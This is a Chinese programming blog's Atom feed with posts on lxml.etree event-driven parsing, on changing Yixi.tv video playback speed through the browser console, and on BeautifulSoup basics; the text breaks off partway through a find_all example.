<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>J.A.R.V.I.S</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://pwn4justice.github.io/"/>
  <updated>2019-07-16T15:41:45.449Z</updated>
  <id>https://pwn4justice.github.io/</id>
  
  <author>
    <name>pwn4justice</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>lxml.etree tutorial - part six</title>
    <link href="https://pwn4justice.github.io/2019/07/16/lxml-etree-tutorial-part-six/"/>
    <id>https://pwn4justice.github.io/2019/07/16/lxml-etree-tutorial-part-six/</id>
    <published>2019-07-16T15:41:09.000Z</published>
    <updated>2019-07-16T15:41:45.449Z</updated>
    
    <content type="html"><![CDATA[<p>本文内容：</p><ul><li>事件驱动解析</li></ul><a id="more"></a><h3 id="事件驱动解析"><a href="#事件驱动解析" class="headerlink" title="事件驱动解析"></a>事件驱动解析</h3><p>有时候，你所需要的只是某个文档树中的一小块内容，所以此时如果占用内存空间去解析整个树，然后遍历或用完销毁都显得不太划算。lxml.etree 支持使用两个<strong>事件驱动</strong>的<strong>解析器接口</strong>来解决这个问题，一个是在构建一颗树(iterparse)的过程中，同时产生解析器事件，另一个则根本就没有构建树，而是运用了’类SAX的模式’在目标对象上调用了回馈方法。这是一个简单的 iterparse() 示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s_file_like = BytesIO(<span class="string">b"&lt;root&gt;&lt;a&gt;data&lt;/a&gt;&lt;/root&gt;"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> event, element <span class="keyword">in</span> etree.iterparse(s_file_like):</span><br><span class="line"><span class="meta">... </span>    print(<span class="string">"%s, %4s, %s"</span> % (event, element.tag, element.text))</span><br><span class="line"><span class="meta">... </span></span><br><span class="line">end,    a, data</span><br><span class="line">end, root, <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>默认的，iterparse() 仅仅在他解析一个元素对象（element）结束的时候产生事件，但是你可以通过参数 <code>events</code> 来控制这个过程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>some_obj = BytesIO(<span class="string">b"&lt;root&gt;&lt;a&gt;data&lt;/a&gt;&lt;/root&gt;"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> event, element <span class="keyword">in</span> etree.iterparse(some_obj, events=(<span class="string">"start"</span>, <span class="string">"end"</span>)):</span><br><span class="line"><span class="meta">... </span>    print(<span class="string">"%5s, %4s, %s"</span> % (event, element.tag, element.text))</span><br><span class="line"><span class="meta">... </span></span><br><span class="line">start, root, <span class="literal">None</span></span><br><span class="line">start,    a, data</span><br><span class="line">  end,    a, data</span><br><span class="line">  end, root, <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>注意一点，当 start 事件发生的时候，标签的文本，tail 文本，和子元素都是暂时不必要显示出来的。仅当 end 事件发生后才能白哦秩对应的元素被解析完毕。<br>你也可以通过使用 <code>.clear()</code> 或者修改元素的内容来节省内存。如果你想用较低的内存使用量来解析一个很大的树，那就应该及时清理（clean up）掉这个树中你已经不再会用到的部分：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>some_obj = BytesIO(<span class="string">b"&lt;root&gt;&lt;a&gt;&lt;b&gt;data&lt;/b&gt;&lt;/a&gt;&lt;a&gt;&lt;b/&gt;&lt;/a&gt;&lt;/root&gt;"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> event, element <span class="keyword">in</span> etree.iterparse(some_obj):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> element.tag == <span class="string">'b'</span>:</span><br><span class="line"><span class="meta">... </span>            print(element.text)</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">elif</span> element.tag == <span class="string">'a'</span>:</span><br><span class="line"><span class="meta">... </span>            print(<span class="string">"** cleaning up the subtree"</span>)</span><br><span class="line"><span class="meta">... </span>            element.clear()</span><br><span class="line"><span class="meta">... </span></span><br><span class="line">data</span><br><span class="line">** cleaning up the subtree</span><br><span class="line"><span class="literal">None</span>;;这里 a 还没有解析完成，而&lt;b/&gt;解析完成了，b 元素中没有文本节点，故为 <span class="literal">None</span></span><br><span class="line">** cleaning up the subtree;;这里解析到了 &lt;/a&gt;，即 a 解析完成了，故输出 cleaning up...</span><br></pre></td></tr></table></figure><p><code>iterparse()</code> 函数的一个重要使用场景是在解析一个很大的 XML 文件的时候。如，数据库导出来的文件（dump）。大多数情况下，这些 XML 的格式都是仅在根节点下面直接挂着一个主要的数据项元素（main data item element），然后后面都是将这个元素重复几千遍。这种情况下，最好练习使用 <code>lxml.etree</code> 模块来构建树，并且只解析那个一直在被重复的元素，可以使用普通的 tree API 来进行数据提取：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>xml_file = BytesIO(<span class="string">b'''\</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;root&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;a&gt;&lt;b&gt;ABCDE&lt;/b&gt;&lt;c&gt;abcde&lt;/c&gt;&lt;/a&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;a&gt;&lt;b&gt;---MORE DATA---&lt;/b&gt;&lt;c&gt;---more data---&lt;/c&gt;&lt;/a&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;a&gt;&lt;b&gt;UVWXYZ&lt;/b&gt;&lt;c&gt;xyz&lt;/c&gt;&lt;/a&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;/root&gt;'''</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> _, element <span class="keyword">in</span> etree.iterparse(xml_file, tag=<span class="string">'a'</span>):</span><br><span class="line"><span class="meta">... </span>    print(<span class="string">'%s *** %s'</span> % (element.findtext(<span class="string">'b'</span>), element[<span class="number">1</span>].text))</span><br><span class="line"><span class="meta">... </span>    element.clear()</span><br><span class="line"><span class="meta">... </span></span><br><span class="line">ABCDE *** abcde</span><br><span class="line">---MORE DATA--- *** ---more data---</span><br><span class="line">UVWXYZ *** xyz</span><br></pre></td></tr></table></figure><p>如果基于某些理由，你根本不想构造一颗树，那么 lxml.etree 的目标解析器接口（target parser interface）可以派上用场。它通过调用目标对象的方法来创造一个 SAX-like 对象。通过实现其中一些或者所有的方法，你可以控制产生哪种事件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">ParserTarget</span>:</span></span><br><span class="line"><span class="meta">... </span>    events = []</span><br><span class="line"><span class="meta">... </span>    close_count = <span class="number">0</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(self, tag, attrib)</span>:</span></span><br><span class="line"><span class="meta">... </span>        self.events.append((<span class="string">"start"</span>, tag, attrib))</span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="meta">... </span>        events, self.events = self.events, []</span><br><span class="line"><span class="meta">... </span>        self.close_count += <span class="number">1</span></span><br><span class="line"><span class="meta">... </span>        <span class="keyword">return</span> events</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser_target = ParserTarget()</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser = etree.XMLParser(target=parser_target)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>events = etree.fromstring(<span class="string">'&lt;root test="true"/&gt;'</span>, parser)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(parser_target.close_count)</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> event <span class="keyword">in</span> events:</span><br><span class="line"><span class="meta">... </span>    print(<span class="string">'event: %s - tag: %s'</span> % (event[<span class="number">0</span>], event[<span class="number">1</span>]))</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">for</span> attr, value <span class="keyword">in</span> event[<span class="number">2</span>].items():</span><br><span class="line"><span class="meta">... </span>        print(<span class="string">' * %s = %s'</span> % (attr, value))</span><br><span class="line">event: start - tag: root</span><br><span class="line"> * test = true</span><br></pre></td></tr></table></figure><p>因为你可以随时随意地复用这个解析器和它的目标，所以你应该小心 <code>.close()</code> 方法会将目标重置到可使用的状态（即使在出错情况下也是如此！）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>events = etree.fromstring(<span class="string">'&lt;root test="true"/&gt;'</span>, parser)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(parser_target.close_count)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>events = etree.fromstring(<span class="string">'&lt;root test="true"/&gt;'</span>, parser)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(parser_target.close_count)</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>events = etree.fromstring(<span class="string">'&lt;root test="true"/&gt;'</span>, parser)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(parser_target.close_count)</span><br><span class="line"><span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> event <span class="keyword">in</span> events:</span><br><span class="line"><span class="meta">... </span>    print(<span class="string">'event: %s - tag: %s'</span> % (event[<span class="number">0</span>], event[<span class="number">1</span>]))</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">for</span> attr, value <span class="keyword">in</span> event[<span class="number">2</span>].items():</span><br><span class="line"><span class="meta">... </span>        print(<span class="string">' * %s = %s'</span> % (attr, value))</span><br><span class="line">event: start - tag: root</span><br><span class="line"> * test = true</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文内容：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;事件驱动解析&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>一席网页视频如何加速?</title>
    <link href="https://pwn4justice.github.io/2019/07/14/%E4%B8%80%E5%B8%AD%E7%BD%91%E9%A1%B5%E8%A7%86%E9%A2%91%E5%A6%82%E4%BD%95%E5%8A%A0%E9%80%9F/"/>
    <id>https://pwn4justice.github.io/2019/07/14/一席网页视频如何加速/</id>
    <published>2019-07-14T09:01:47.000Z</published>
    <updated>2019-07-14T09:09:34.546Z</updated>
    
    <content type="html"><![CDATA[<p>一席（Yixi.tv）中的视频没有加速功能，如何通过修改（或利用）网页 javascript 来更改 HTML5 视频的播放速度呢？</p><a id="more"></a><p>了解：网页视频播放速度使用的是 <code>playbackRate</code> ，据猜测，这可能是个属性，或者方法。</p><ol><li><p>打开 F12 ，找到视频的 div ：<code>&lt;div ... id=&quot;my-video&quot;&gt;...&lt;/div&gt;</code></p></li><li><p>在 console 编写如下代码：</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> video = <span class="built_in">document</span>.getElementById(<span class="string">"my-video"</span>);video.player.playbackRate(<span class="number">1.25</span>)</span><br></pre></td></tr></table></figure></li><li><p>如何知道playbackRate是个方法的呢？一个个测试</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">alert(video.playbackRate)==&gt; undefined</span><br><span class="line">alert(video.playbackRate())</span><br><span class="line">alert(video.让其自动弹出提示)==&gt; 找到了 player 这么个东西，或许里面会有 playbackRate</span><br><span class="line">alert(video.player.让其自动弹出提示)==&gt; 找到了 playbackRate</span><br><span class="line">alert(video.player.playbackRate)==&gt; 弹出了 playbackRate 的内容，如下:</span><br><span class="line">---- playbackRate() ----</span><br><span class="line">function playbackRate(rate)&#123;</span><br><span class="line">if(rate !== undefined)&#123;</span><br><span class="line">this.techCall_(&apos;setPlaybackRate&apos;, rate);</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(this.tech_ &amp;&amp; this.tech_.featuresPlaybackRate)&#123;</span><br><span class="line">return this.techGet_(&apos;playbackRate&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return 1.0;//如果没有指定 rate ，就使用 1.0 这个默认值... 所以在 console 里给其指定一个值就好了</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一席（Yixi.tv）中的视频没有加速功能，如何通过修改（或利用）网页 javascript 来更改 HTML5 视频的播放速度呢？&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>BeautifulSoup</title>
    <link href="https://pwn4justice.github.io/2019/07/08/BeautifulSoup/"/>
    <id>https://pwn4justice.github.io/2019/07/08/BeautifulSoup/</id>
    <published>2019-07-08T14:25:09.000Z</published>
    <updated>2019-07-08T14:41:33.161Z</updated>
    
    <content type="html"><![CDATA[<p>本文是对《Python3 网络爬虫开发实战的》的部分实践以及探讨。</p><a id="more"></a><p>使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup = BeautifulSoup(<span class="string">'&lt;p&gt;Hello&lt;/p&gt;'</span>, <span class="string">'lxml'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(type(soup))</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">bs4</span>.<span class="title">BeautifulSoup</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span><span class="params">(soup.p)</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">p</span>&gt;<span class="title">Hello</span>&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span><span class="params">(type<span class="params">(soup.p)</span>)</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">bs4</span>.<span class="title">element</span>.<span class="title">Tag</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span><span class="params">(soup.p.string)</span></span></span><br><span class="line"><span class="class"><span class="title">Hello</span></span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span><span class="params">(soup.p.text)</span></span></span><br><span class="line"><span class="class"><span class="title">Hello</span></span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span><span class="params">(type<span class="params">(soup.p.string)</span>)</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">bs4</span>.<span class="title">element</span>.<span class="title">NavigableString</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span><span class="params">(type<span class="params">(soup.p.text)</span>)</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">str</span>'&gt;</span></span><br></pre></td></tr></table></figure><p>更多使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>html=<span class="string">"""</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse's story&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;body&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;p class="title" name="dromouse"&gt;&lt;b&gt;The Dormouse's story&lt;/b&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;p class="story"&gt;Once upon a time there were three little sisters; and their names were</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;a href="http://example.com/elsie" class="sister" id="link1"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;a href="http://example.com/lacie" class="sister" id="link2"&gt;Lacie&lt;/a&gt; and</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;a href="http://example.com/tillie" class="sister" id="link3"&gt;Tillie&lt;/a&gt;;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>and they lived at the bottom of a well.&lt;/p&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;p class="story"&gt;...&lt;/p&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>"""</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(type(html))</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">str</span>'&gt;</span></span><br><span class="line">&gt;&gt;&gt; soup = BeautifulSoup(html, 'lxml')</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(soup.prettify())</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt;</span><br><span class="line">   The Dormouse<span class="string">'s story</span></span><br><span class="line"><span class="string">  &lt;/title&gt;</span></span><br><span class="line"><span class="string"> &lt;/head&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt;</span></span><br><span class="line"><span class="string">  &lt;p class="title" name="dromouse"&gt;</span></span><br><span class="line"><span class="string">   &lt;b&gt;</span></span><br><span class="line"><span class="string">    The Dormouse'</span>s story</span><br><span class="line">   &lt;/b&gt;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">  &lt;p class="story"&gt;</span><br><span class="line">   Once upon a time there were three little sisters; <span class="keyword">and</span> their names were</span><br><span class="line">   &lt;a class="sister" href="http://example.com/elsie" id="link1"&gt;</span><br><span class="line">    &lt;!-- Elsie --&gt;</span><br><span class="line">   &lt;/a&gt;</span><br><span class="line">   ,</span><br><span class="line">   &lt;a class="sister" href="http://example.com/lacie" id="link2"&gt;</span><br><span class="line">    Lacie</span><br><span class="line">   &lt;/a&gt;</span><br><span class="line">   <span class="keyword">and</span></span><br><span class="line">   &lt;a class="sister" href="http://example.com/tillie" id="link3"&gt;</span><br><span class="line">    Tillie</span><br><span class="line">   &lt;/a&gt;</span><br><span class="line">   ;</span><br><span class="line"><span class="keyword">and</span> they lived at the bottom of a well.</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">  &lt;p class="story"&gt;</span><br><span class="line">   ...</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(type(soup.prettify()))</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">str</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span><span class="params">(soup.title)</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">title</span>&gt;<span class="title">The</span> <span class="title">Dormouse</span>'<span class="title">s</span> <span class="title">story</span>&lt;/<span class="title">title</span>&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span><span class="params">(soup)</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">html</span>&gt;&lt;<span class="title">head</span>&gt;&lt;<span class="title">title</span>&gt;<span class="title">The</span> <span class="title">Dormouse</span>'<span class="title">s</span> <span class="title">story</span>&lt;/<span class="title">title</span>&gt;&lt;/<span class="title">head</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line">&lt;p class="title" name="dromouse"&gt;&lt;b&gt;The Dormouse's story&lt;/b&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class="story"&gt;Once upon a time there were three little sisters; and their names were</span><br><span class="line">&lt;a class="sister" href="http://example.com/elsie" id="link1"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,</span><br><span class="line">&lt;a class="sister" href="http://example.com/lacie" id="link2"&gt;Lacie&lt;/a&gt; and</span><br><span class="line">&lt;a class="sister" href="http://example.com/tillie" id="link3"&gt;Tillie&lt;/a&gt;;</span><br><span class="line">and they lived at the bottom of a well.&lt;/p&gt;</span><br><span class="line">&lt;p class="story"&gt;...&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;;;这里自动补全了缺失的 HTML 标签</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(soup.p)</span><br><span class="line">&lt;p class="title" name="dromouse"&gt;&lt;b&gt;The Dormouse's story&lt;/b&gt;&lt;/p&gt;;;只返回第一个 p 标签</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(soup.p[<span class="number">2</span>]);;这里会出错！！！没有这种写法的...</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">"C:\Users\Admin\AppData\Local\Programs\Python\Python37\lib\site-packages\bs4\element.py"</span>, line <span class="number">1016</span>, <span class="keyword">in</span> __getitem__</span><br><span class="line">    <span class="keyword">return</span> self.attrs[key]</span><br><span class="line">KeyError: <span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(soup.title.string)</span><br><span class="line">The Dormouse<span class="string">'s story</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; print(type(soup.title.string))</span></span><br><span class="line"><span class="string">&lt;class '</span>bs4.element.NavigableString<span class="string">'&gt;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; print(type(soup.title.text))</span></span><br><span class="line"><span class="string">&lt;class '</span>st<span class="string">r'&gt;</span></span><br></pre></td></tr></table></figure><p><strong>问题：</strong>调用<code>.string</code> 和调用 <code>.text</code> 有何区别？除了类型不同之外… 换句话说：为什么不使用 <code>.text</code> 不也可以得到文本吗？</p><h3 id="find-all-方法"><a href="#find-all-方法" class="headerlink" title="find_all 方法"></a>find_all 方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>html=<span class="string">'''</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;div class="panel"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;div class="panel-heading"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;h4&gt;Hello&lt;/h4&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;/div&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;div class="panel-body"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;ul class="list" id="list-1"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>            &lt;li class="element"&gt;Foo&lt;/li&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>            &lt;li class="element"&gt;Bar&lt;/li&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>            &lt;li class="element"&gt;Jay&lt;/li&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;/ul&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;ul class="list list-small" id="list-2"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>            &lt;li class="element"&gt;Foo&lt;/li&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>            &lt;li class="element"&gt;Bar&lt;/li&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;/ul&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;/div&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;/div&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>'''</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; 